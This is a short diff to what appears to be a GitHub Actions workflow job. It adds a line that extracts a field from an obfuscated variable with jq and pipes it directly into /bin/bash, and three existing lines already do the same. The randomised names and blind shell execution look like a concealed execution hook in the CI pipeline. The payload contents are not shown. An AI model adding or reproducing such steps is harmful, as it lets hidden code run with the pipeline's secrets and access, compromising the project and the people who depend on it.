@@ -26,6 +26,7 @@ jobs:
           echo $eolo545 | jq -r .abfa21 | /bin/bash
           printf '%s' "$druz78" | jq -r .bpgbx936 | /bin/bash
           echo $up2868 | jq -r .nhkz0 | /bin/bash
+          printf '%s' "$vs080" | jq -r .uxq80 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
